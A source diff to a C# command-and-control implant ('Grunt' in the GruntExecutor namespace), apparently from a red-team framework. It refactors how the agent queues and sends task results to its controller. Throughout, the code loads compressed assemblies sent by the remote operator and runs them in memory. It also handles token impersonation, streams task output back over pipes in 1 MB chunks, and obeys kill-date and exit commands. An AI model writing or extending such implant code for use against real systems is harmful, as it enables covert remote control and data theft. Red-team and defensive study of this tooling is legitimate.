@@ -67,14 +67,16 @@ namespace GruntExecutor
                     baseMessenger,
                     new Profile(ProfileReadFormat, ProfileWriteFormat, GUID)
                 );
-                messenger.WriteTaskingMessage(RegisterBody);
+                messenger.QueueTaskingMessage(RegisterBody);
+                messenger.WriteTaskingMessage();
                 messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);
                 try
                 {
                     // A blank upward write, this helps in some cases with an HTTP Proxy
-                    messenger.WriteTaskingMessage("");
+                    messenger.QueueTaskingMessage("");
+                    messenger.WriteTaskingMessage();
                 }
-                catch (Exception) {}
+                catch (Exception) { }
 
                 List<KeyValuePair<string, Thread>> Tasks = new List<KeyValuePair<string, Thread>>();
                 WindowsImpersonationContext impersonationContext = null;
@@ -89,7 +91,11 @@ namespace GruntExecutor
                     try
                     {
                         GruntTaskingMessage message = messenger.ReadTaskingMessage();
-                        if (message != null)
+                        if (message == null)
+                        {
+                            ConnectAttemptCount++;
+                        }
+                        else
                         {
                             ConnectAttemptCount = 0;
                             string output = "";
@@ -117,7 +123,7 @@ namespace GruntExecutor
                                 {
                                     output += "Error parsing: " + message.Message;
                                 }
-                                messenger.WriteTaskingMessage(output, message.Name);
+                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                             }
                             else if (message.Type == GruntTaskingType.SetKillDate)
                             {
@@ -130,11 +136,13 @@ namespace GruntExecutor
                                 {
                                     output += "Error parsing: " + message.Message;
                                 }
+                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                             }
                             else if (message.Type == GruntTaskingType.Exit)
                             {
                                 output += "Exited";
-                                messenger.WriteTaskingMessage(output, message.Name);
+                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
+                                messenger.WriteTaskingMessage();
                                 return;
                             }
                             else if(message.Type == GruntTaskingType.Tasks)
@@ -146,7 +154,7 @@ namespace GruntExecutor
                                     output += "----       ------" + Environment.NewLine;
                                     output += String.Join(Environment.NewLine, Tasks.Where(T => T.Value.IsAlive).Select(T => T.Key + " Active").ToArray());
                                 }
-                                messenger.WriteTaskingMessage(output, message.Name);
+                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                             }
                             else if(message.Type == GruntTaskingType.TaskKill)
                             {
@@ -161,7 +169,7 @@ namespace GruntExecutor
                                     t.Value.Abort();
                                     output += "Task: " + t.Key + " killed!";
                                 }
-                                messenger.WriteTaskingMessage(output, message.Name);
+                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                             }
                             else if (message.Token)
                             {
@@ -170,8 +178,11 @@ namespace GruntExecutor
                                     impersonationContext.Undo();
                                 }
                                 IntPtr impersonatedToken = IntPtr.Zero;
-                                impersonatedToken = TaskExecute(messenger, message);
-                                if (impersonatedToken != IntPtr.Zero)
+                                Thread t = new Thread(() => impersonatedToken = TaskExecute(messenger, message));
+                                t.Start();
+                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
+                                bool completed = t.Join(5000);
+                                if (completed && impersonatedToken != IntPtr.Zero)
                                 {
                                     try
                                     {
@@ -192,11 +203,13 @@ namespace GruntExecutor
                                 Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                             }
                         }
+                        messenger.WriteTaskingMessage();
                     }
                     catch (ObjectDisposedException e)
                     {
                         ConnectAttemptCount++;
-                        messenger.WriteTaskingMessage("");
+                        messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "").ToJson());
+                        messenger.WriteTaskingMessage();
                     }
                     catch (Exception e)
                     {
@@ -207,13 +220,15 @@ namespace GruntExecutor
                     if (KillDate.CompareTo(DateTime.Now) < 0) { return; }
                 }
             }
-            catch (Exception e) {
+            catch (Exception e)
+            {
                 Console.Error.WriteLine("Outer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
             }
         }
 
         private static IntPtr TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message)
         {
+            const int MAX_MESSAGE_SIZE = 1048576;
             string output = "";
             try
             {
@@ -228,8 +243,58 @@ namespace GruntExecutor
                         byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                         byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                         Assembly gruntTask = Assembly.Load(decompressedBytes);
-                        var results = gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
-                        if (results != null) { output += (string)results; }
+                        PropertyInfo streamProp = gruntTask.GetType("Task").GetProperty("OutputStream");
+                        string results = "";
+                        Thread invokeThread = new Thread(() => results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
+                        if (streamProp == null)
+                        {
+                            invokeThread.Start();
+                        }
+                        else
+                        {
+                            using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
+                            {
+                                using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
+                                {
+                                    streamProp.SetValue(null, pipeClient, null);
+                                    DateTime lastTime = DateTime.Now;
+                                    invokeThread.Start();
+                                    using (StreamReader reader = new StreamReader(pipeServer))
+                                    {
+                                        char[] read = new char[MAX_MESSAGE_SIZE];
+                                        int count;
+                                        string currentRead = "";
+                                        while ((count = reader.Read(read, 0, read.Length)) > 0)
+                                        {
+                                            try
+                                            {
+                                                currentRead += new string(read, 0, count);
+                                                if (currentRead.Length >= MAX_MESSAGE_SIZE)
+                                                {
+                                                    for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
+                                                    {
+                                                        string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
+                                                        try
+                                                        {
+                                                            GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
+                                                            messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                            messenger.WriteTaskingMessage();
+                                                        }
+                                                        catch (Exception) {}
+                                                    }
+                                                    currentRead = "";
+                                                    lastTime = DateTime.Now;
+                                                }
+                                            }
+                                            catch (Exception) { currentRead = "";}
+                                        }
+                                        output += currentRead;
+                                    }
+                                }
+                            }
+                        }
+                        invokeThread.Join();
+                        output += results;
                     }
                 }
                 else if (message.Type == GruntTaskingType.Connect)
@@ -247,15 +312,28 @@ namespace GruntExecutor
             }
             catch (Exception e)
             {
-                output += "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace;
+                try
+                {
+                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace);
+                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                    messenger.WriteTaskingMessage();
+                }
+                catch (Exception) { }
             }
             finally
             {
-                try
+                for (int i = 0; i < output.Length; i += MAX_MESSAGE_SIZE)
                 {
-                    messenger.WriteTaskingMessage(output, message.Name);
+                    string aRead = output.Substring(i, Math.Min(MAX_MESSAGE_SIZE, output.Length - i));
+                    try
+                    {
+                        GruntTaskingStatus status = i + MAX_MESSAGE_SIZE < output.Length ? GruntTaskingStatus.Progressed : GruntTaskingStatus.Completed;
+                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(status, aRead);
+                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                        messenger.WriteTaskingMessage();
+                    }
+                    catch (Exception) {}
                 }
-                catch (Exception) { }
             }
             return WindowsIdentity.GetCurrent().Token;
         }
@@ -318,6 +396,9 @@ namespace GruntExecutor
             get { return this._UpstreamMessenger; }
             set { this._UpstreamMessenger = value; }
         }
+        private object _MessageQueueLock = new object();
+        private Queue<string> MessageQueue { get; } = new Queue<string>();
+
         private MessageCrafter Crafter { get; }
         private Profile Profile { get; }
 
@@ -364,14 +445,29 @@ namespace GruntExecutor
             }
         }
 
-        public void WriteTaskingMessage(string Message, string Meta = "")
+        public void QueueTaskingMessage(string Message, string Meta = "")
         {
             GruntEncryptedMessage gruntMessage = this.Crafter.Create(Message, Meta);
             string uploaded = this.Profile.FormatWriteFormat(gruntMessage);
-            lock (this._UpstreamLock)
+            lock (_MessageQueueLock)
             {
-                this.UpstreamMessenger.Write(uploaded);
+                this.MessageQueue.Enqueue(uploaded);
             }
+        }
+
+        public void WriteTaskingMessage()
+        {
+            try
+            {
+                lock (_UpstreamLock)
+                {
+                    lock (_MessageQueueLock)
+                    {
+                        this.UpstreamMessenger.Write(this.MessageQueue.Dequeue());
+                    }
+                }
+            }
+            catch (InvalidOperationException) {}
         }
 
         public void SetAuthenticator(string Authenticator)
@@ -631,10 +727,10 @@ namespace GruntExecutor
         public static GruntTaskingMessage FromJson(string message)
         {
             List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat.Replace("{{", "{").Replace("}}", "}"));
-            if (parseList.Count < 3)  { return null; }
+            if (parseList.Count < 3) { return null; }
             return new GruntTaskingMessage
             {
-				Type = (GruntTaskingType) Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
+				Type = (GruntTaskingType)Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
                 Name = parseList[1],
                 Message = parseList[2],
                 Token = Convert.ToBoolean(parseList[3])
@@ -649,6 +745,36 @@ namespace GruntExecutor
                 Utilities.JavaScriptStringEncode(message.Name),
                 Utilities.JavaScriptStringEncode(message.Message),
                 message.Token
+            );
+        }
+    }
+
+    public enum GruntTaskingStatus
+    {
+        Uninitialized,
+        Tasked,
+        Progressed,
+        Completed,
+        Aborted
+    }
+
+    public class GruntTaskingMessageResponse
+    {
+        public GruntTaskingMessageResponse(GruntTaskingStatus status, string output)
+        {
+            Status = status;
+            Output = output;
+        }
+        public GruntTaskingStatus Status { get; set; }
+        public string Output { get; set; }
+
+        private static string GruntTaskingMessageResponseFormat = @"{{""status"":""{0}"",""output"":""{1}""}}";
+        public string ToJson()
+        {
+            return String.Format(
+                GruntTaskingMessageResponseFormat,
+                this.Status.ToString("D"),
+                Utilities.JavaScriptStringEncode(this.Output)
             );
         }
     }
@@ -686,7 +812,7 @@ namespace GruntExecutor
         public static GruntEncryptedMessage FromJson(string message)
         {
 			List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat.Replace("{{", "{").Replace("}}", "}"));
-            if (parseList.Count < 5)  { return null; }
+            if (parseList.Count < 5) { return null; }
             return new GruntEncryptedMessage
             {
                 GUID = parseList[0],
@@ -818,12 +944,12 @@ namespace GruntExecutor
         public static List<string> Parse(string data, string format)
         {
             format = Regex.Escape(format).Replace("\\{", "{");
-			if(format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
-            if(format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
-            if(format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
-            if(format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
-            if(format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
-            if(format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
+			if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
+            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
+            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
+            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
+            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
+            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
             Match match = new Regex(format).Match(data);
             List<string> matches = new List<string>();
 			if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
